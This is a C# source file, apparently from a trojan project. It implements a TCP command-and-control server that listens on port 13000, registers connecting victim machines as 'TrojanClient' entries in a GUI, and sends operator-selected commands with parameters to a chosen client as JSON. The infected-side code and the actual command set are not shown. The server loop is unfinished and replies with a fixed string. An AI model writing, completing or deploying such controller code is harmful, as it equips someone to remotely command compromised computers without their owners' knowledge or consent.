using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Server.UI;
using Newtonsoft.Json;

namespace Server.TCP
{

    public class TcpServer
    {
        static Window1 serverGUI;

        private const Int32 PORT = 13000;

        //private const String ADDRESS = "127.0.0.1";

        //private IPAddress localAddress;

        public TcpListener tcpServer;

        //private static Byte[] bytes;

        //private static String data;

        //static DateTime localDate;

        static CultureInfo cultureInfo;

        private static int clientCount = 0;

        //static NetworkStream stream;

        private List<TrojanClient>  trojanClients = new List<TrojanClient>();

        public TcpServer()
        {
            serverGUI = new Window1();
            serverGUI.Show();
            serverGUI.SentPressed += SendMessage;

            //cultureInfo = new CultureInfo(cultureName);
            cultureInfo = CultureInfo.CurrentCulture;

            BackgroundWorker worker1 = new BackgroundWorker();
            worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
            worker1.RunWorkerAsync();
        }

        private void Worker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                {
                    //localAddress = IPAddress.Parse(ADDRESS);
                    tcpServer = new TcpListener(/*localAddress*/ IPAddress.Any, PORT);
                    //localDate = DateTime.Now;
                    tcpServer.Start();
                    while (true)
                    {
                        var client = await tcpServer.AcceptTcpClientAsync();
                        
                        int i = 0;

                        NetworkStream stream = client.GetStream();

                        var bytes = new Byte[256];
                        if (stream.CanRead)
                        {
                            i = await stream.ReadAsync(bytes, 0, bytes.Length);
                        }

                        var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        trojanClients.Add(new TrojanClient(client, clientName));
                        serverGUI.SetClients(trojanClients.Select(x => x.Name));
                        ThreadPool.QueueUserWorkItem(ThreadProc, client);
                    }

                }));
            }
            catch (Exception ex)
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(delegate ()
                {
                    serverGUI.SetLabel(ex.Message + "\n");
                }));
            }
            finally
            {
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }
            }
        }

        private static async void ThreadProc(object obj)
        {
            await serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(async delegate ()
            {
                var client = (TcpClient)obj;
                serverGUI.SetLabel("Connected");
                var bytes = new Byte[256];
                string data = null;
                // Get a stream object for reading and writing
                NetworkStream stream = client.GetStream();

                int i = 0;

                while (true)
                {
                    if (stream.CanRead)
                    {
                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
                    }
                    //localDate = DateTime.Now;

                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                    byte[] msg = null;

                    clientCount++;

                    msg = System.Text.Encoding.ASCII.GetBytes("ceva");
                    if (stream.CanWrite)
                    {
                        await stream.WriteAsync(msg, 0, msg.Length);
                    }


                }
            }));
        }

        async void SendMessage(object sender, EventArgs e)
        {
            //var client = (TcpClient)obj;
            //serverGUI.SetLabel("Connected");
            int clientId = serverGUI.GetClientId();
            if (clientId >= 0)
            {
                var client = trojanClients[serverGUI.GetClientId()].Client;
                var bytes = new Byte[256];
                // Get a stream object for reading and writing
                NetworkStream stream = client.GetStream();
                byte[] msg = null;
                Command command = new Command(serverGUI.GetCommandId(), serverGUI.GetParameters());
                string output = JsonConvert.SerializeObject(command);
                msg = System.Text.Encoding.ASCII.GetBytes(output);
                if (stream.CanWrite)
                {
                    await stream.WriteAsync(msg, 0, msg.Length);
                }

                if (stream.CanRead)
                {
                    await stream.ReadAsync(bytes, 0, bytes.Length);
                }
            }

        }
    }
}
